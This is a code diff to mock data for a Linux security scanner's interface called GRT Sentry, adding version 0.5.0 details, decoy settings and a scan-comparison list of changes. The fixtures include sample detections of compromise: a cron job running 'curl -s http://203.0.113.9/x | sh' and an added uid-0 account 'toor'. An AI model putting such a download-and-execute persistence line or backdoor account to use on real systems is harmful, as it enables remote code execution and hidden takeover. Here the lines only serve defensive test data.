@@ -13,6 +13,7 @@ const status = {
   queued_files: 37,
   new_issues: 2,
   scan_id: 12,
+  changes: 4,
   issues: [
     {
       id: "a", kind: "malicious_file", severity: "critical",
@@ -129,10 +130,10 @@ const responses = {
     auto_quarantine: false, auto_quarantine_threshold: 10,
     vt_interval_seconds: 15, vt_budget_per_scan: 40, connection_refresh_seconds: 0, watch_folders: false,
     integrity_paths: ["/etc/passwd", "/etc/hosts"], auth_log_path: "/var/log/auth.log",
-    failed_login_threshold: 5, auto_block: true, auto_block_after: 10, scan_on_startup: true, theme: "system",
+    failed_login_threshold: 5, auto_block: true, auto_block_after: 10, decoy: false, decoy_port: 2222, scan_on_startup: true, theme: "system",
   },
   system_info: {
-    version: "0.4.0", system: "Linux",
+    version: "0.5.0", system: "Linux",
     geoip_available: true, geoip_path: "/usr/share/grt-sentry/GeoLite2-City.mmdb",
     elevation_available: true, elevation_note: "pkexec", elevated: false,
     firewall_available: true, firewall_note: "nftables, through scripts/setup-nftables.sh",
@@ -144,14 +145,14 @@ const responses = {
     indicators_path: "/home/user/.config/grt-sentry/indicators.txt", indicator_count: 3, quarantined_files: 1,
     recent_scans: [{ timestamp: now - 120, files_checked: 1204, issues_found: 2 }],
     schedule: { installed: true, enabled: true, frequency: "daily", next_run: "Tue 03:00", supported: true },
-    watched_folders: [],
+    watched_folders: [], decoy_listening: null, confinement: "AppArmor, grt-sentry (enforce)",
   },
   list_scans: [
     { id: 12, timestamp: now - 120, files_checked: 1204, issues_found: 6 },
     { id: 11, timestamp: now - 86400, files_checked: 1190, issues_found: 4 },
     { id: 10, timestamp: now - 172800, files_checked: 1187, issues_found: 4 },
   ],
-  scan_report: "GRT Sentry 0.4.0, scan of 2026-11-06 14:03\n\n1204 files checked. 5 things need attention, 2 of them new. 1 set aside, 1 notes.\n\nNeeds attention\n---------------\n\nCRITICAL  Malicious file: flagged by 34 engines\n          /home/user/Downloads/setup_installer.exe\n          new in this scan\n",
+  scan_report: "GRT Sentry 0.5.0, scan of 2026-11-06 14:03\n\n1204 files checked. 5 things need attention, 2 of them new. 1 set aside, 1 notes.\n\nNeeds attention\n---------------\n\nCRITICAL  Malicious file: flagged by 34 engines\n          /home/user/Downloads/setup_installer.exe\n          new in this scan\n",
   compare_scans: {
     older: { id: 11, timestamp: now - 86400, files_checked: 1190, issues_found: 4 },
     newer: { id: 12, timestamp: now - 120, files_checked: 1204, issues_found: 6 },
@@ -162,6 +163,11 @@ const responses = {
       { fingerprint: "z", kind: "suspicious_process", severity: "warning", title: "curl runs from a temporary folder", location: "curl (pid 3301)", detail: null, first_seen: now - 90000, times_seen: 3, set_aside: false },
     ],
     unchanged: 4,
+    changes: [
+      { kind: "startup", heading: "What starts by itself", lines: ["added: system cron:/etc/cron.d/update-check (curl -s http://203.0.113.9/x | sh)"] },
+      { kind: "account", heading: "Accounts", lines: ["added: toor (uid 0, /bin/bash)"] },
+      { kind: "package", heading: "Installed packages", lines: ["changed: openssl (3.0.13-1 before, 3.0.14-1 now)", "added: nmap (7.94)"] },
+    ],
   },
   inspect_quarantined: {
     size: 48213, kind: "Linux program (ELF), 64-bit, x86-64", disguise: "The name ends in .pdf, but the contents say: Linux program (ELF), 64-bit, x86-64.",
